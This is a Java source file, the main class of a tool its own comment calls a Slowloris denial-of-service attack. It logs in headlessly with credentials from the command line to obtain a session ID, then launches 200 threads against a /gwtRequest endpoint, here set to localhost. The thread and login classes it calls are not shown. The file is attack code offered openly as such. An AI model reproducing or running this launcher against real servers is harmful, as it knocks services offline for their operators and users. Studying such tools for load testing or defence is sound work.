package com.github.hchan.slowloris;

import java.net.URL;

import lombok.extern.slf4j.Slf4j;
/**
 * 
 * @author henry.chan
 * a DoS attack using Slowloris https://en.wikipedia.org/wiki/Slowloris_(computer_security)
 */
@Slf4j
public class SlowlorisApp {
	private static final int MAX_THREADS = 200;
	public static CharSequence USERNAME = null;
	public static CharSequence PASSWORD = null;
	public static String phantomJSLocation = "/Users/henry.chan/Downloads/phantomjs-2.1.1-macosx/bin/phantomjs";
	public static String initialUrl = "http://localhost:8080"; // used to get jsessionId


	public static void main(String[] args) {
		try {
			USERNAME = args[0];
			PASSWORD = args[1];
			String jsessionid = HeadlessLoginToGetJsessionId.getJsessionId();
			log.info("jsessionid=" + jsessionid);
			for (int i = 0; i < MAX_THREADS; i++) {
				URL url = new URL(initialUrl + "/gwtRequest");
				SlowlorisThread sloworisThread = new SlowlorisThread(url, i, jsessionid);
				sloworisThread.start();
			}
		} catch (Exception e) {
			log.error("", e);
		}
	}
}
